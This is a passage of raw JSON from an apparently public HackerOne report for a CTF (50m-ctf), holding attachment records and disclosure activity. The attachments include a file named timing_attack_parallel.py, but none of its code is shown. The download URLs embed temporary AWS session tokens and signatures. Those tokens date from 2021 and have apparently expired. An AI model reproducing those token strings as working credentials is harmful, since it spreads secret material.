aldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=1d95fb95a311984e7ac8a105313fc2c6e429f039e958676de0a006d48e048520","file_size":4371365,"type":"image/gif"},{"id":434415,"file_name":"h1thermostat.tar.gz","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/415/011d21e6abaaea33b1687b04ff562beada1ff2d7/h1thermostat.tar.gz?response-content-disposition=attachment%3B%20filename%3D%22h1thermostat.tar.gz%22%3B%20filename%2A%3DUTF-8%27%27h1thermostat.tar.gz\u0026response-content-type=application%2Fgzip\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=fb61060f59208d5719853f31e9e051f281f62207704b65210f8e419fd07e36d4","file_size":17664,"type":"application/gzip"},{"id":434416,"file_name":"timing_attack_parallel.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/416/d84bd034e600fe11309124c916cea9f3889da53c/timing_attack_parallel.py?response-content-disposition=attachment%3B%20filename%3D%22timing_attack_parallel.py%22%3B%20filename%2A%3DUTF-8%27%27timing_attack_parallel.py\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150705Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c2d78d510cfee9c8f4a4ccdd21c447a29fcf0b080f6113be042390e8069d2589","file_size":1438,"type":"text/plain"}],"allow_singular_disclosure_at":"2019-05-05T21:50:16.120Z","allow_singular_disclosure_after":-76871809.25718008,"singular_disclosure_allowed":true,"vote_count":6,"voters":["spaceraccoon","ali","pythonlee","ragulbalaji","sinswriter","brownbear"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4245302,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'd appreciate if @spaceraccoon was given access to this report, since I can't find a way to add him as a collaborator.","automated_response":false,"created_at":"2019-03-03T01:37:08.298Z","updated_at":"2019-03-03T01:37:08.298Z","actor":{"username":"collinmay","cleared":false,"url":"/collinmay","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/358/631/64f8028474ea26506ce10aa7fb251f661de4e110_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4256906,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for sending in this report.  We'll close it and enable disclosure once the CTF has closed and all reports are in.","automated_response":false,"created_at":"2019-03-05T01:25:27.465Z","updated_at":"2019-03-05T01:25:27.465Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4492857,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for the amazing report! We'll be announcing the winners shortly, so we'll let you know if you're one of the reports selected. Going to close this and then request public disclosure now.","automated_response":false,"created_at":"2019-04-05T18:35:28.538Z","updated_at":"2019-04-05T18:35:28.538Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"collinmay","url":"/collinmay"},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4494310,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Awesome. I'm not seeing your request for disclosure, so I'm making one of my own.","automated_response":false,"created_at":"2019-04-05T21:50:16.083Z","updated_at":"2019-04-05T21:50:16.083Z","first_to_agree":true,"actor":{"username":"collinmay","cleared":false,"url":"/collinmay","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/358/631/64f8028474ea26506ce10aa7fb251f661de4e110_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4499751,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2019-04-06T23:18:16.123Z","updated_at":"2019-04-06T23:18:16.123Z","actor":{"username":"spaceraccoon","cleared":true,"url":"/spaceraccoon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/c5zYRQsvGPQP6MxHYYN4r5Jp/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509062,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-04-08T15:52:54.001Z","updated_at":"2019-04-08T15:52:54.001Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509063,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-04-08T15:52:54.094Z","updated_at":"2019-04-08T15:52:54.094Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}